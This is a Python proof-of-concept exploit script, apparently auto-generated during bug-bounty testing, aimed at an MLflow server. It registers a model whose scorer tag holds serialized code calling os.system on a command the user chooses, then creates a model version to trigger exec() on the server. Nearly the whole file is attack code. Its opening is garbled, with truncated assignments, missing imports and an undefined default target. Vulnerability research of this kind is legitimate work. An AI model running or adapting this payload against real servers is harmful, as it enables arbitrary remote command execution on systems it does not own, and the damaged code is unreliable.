#!/usr/bin/env python3
# PoC for mlflow (/tmp/bounty_test/mlflow/mlflow)
# Path: rce-019
# Auto-generated — run with: python3 mlflow-rce-019-poc.py
#
["MLFLOW_TRACKING_URI"] = "databricks://some-workspace"
    print("[*] Set MLFLOW_TRACKING_URI to databricks://some-workspace to bypass check")

    # Step 2: Prepare malicious scorer payload
    # The payload will be executed via exec() in recreate_function
    # We use a benign command by default; change to something else if needed
    payload_code = f"import os; os.system('{command}')"
    # The scorer function signature and name
    call_signature = "(x):"
    original_func_name = "malicious_scorer"
    call_source = payload_code

    # Serialized data structure expected by the API
    serialized_data = {
        "call_source": call_source,
        "call_signature": call_signature,
        "original_func_name": original_func_name,
        "name": "poc_scorer",
        "description": "PoC scorer",
        "aggregations": [],
        "mlflow_version": "2.10.0",
        "serialization_version": "1"
    }

    # Step 3: Register the scorer via MLflow REST API
    # The endpoint for creating a registered model (used for prompts/scorers)
    register_url = urljoin(target_url, "/api/2.0/mlflow/registered-models/create")
    model_name = "poc_scorer_model"
    register_payload = {
        "name": model_name,
        "tags": [{"key": "mlflow.scorer", "value": json.dumps(serialized_data)}]
    }

    print(f"[*] Registering malicious model '{model_name}' on {target_url}")
    try:
        r = requests.post(register_url, json=register_payload, timeout=10)
        if r.status_code != 200:
            print(f"[-] Failed to register model: {r.text}")
            return False
        print("[+] Model registered successfully")
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
        return False

    # Step 4: Create a model version to trigger loading of the scorer
    # The version creation will attempt to deserialize the scorer, triggering exec()
    version_url = urljoin(target_url, "/api/2.0/mlflow/model-versions/create")
    version_payload = {
        "name": model_name,
        "source": "dummy",
        "tags": [{"key": "mlflow.scorer", "value": json.dumps(serialized_data)}]
    }

    print("[*] Creating model version to trigger deserialization...")
    try:
        r = requests.post(version_url, json=version_payload, timeout=10)
        if r.status_code != 200:
            print(f"[-] Failed to create model version: {r.text}")
            # Even if it fails, the exec() might have already been triggered
            print("[*] Check if command was executed despite error")
        else:
            print("[+] Model version created")
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
        return False

    # Step 5: Verify execution (optional)
    if command == "touch /tmp/poc_success.txt":
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] PoC successful! File /tmp/poc_success.txt created.")
        else:
            print("[-] File not found. Execution may have failed or server is not vulnerable.")
    else:
        print("[*] Custom command executed. Verify manually.")

    return True

def main():
    parser = argparse.ArgumentParser(description="MLflow RCE PoC")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="MLflow server URL")
    parser.add_argument("--cmd", default="touch /tmp/poc_success.txt", help="Command to execute")
    args = parser.parse_args()

    print("[*] Starting MLflow RCE exploit")
    success = exploit(args.target, args.cmd)
    if success:
        print("[*] Exploit completed")
    else:
        print("[*] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
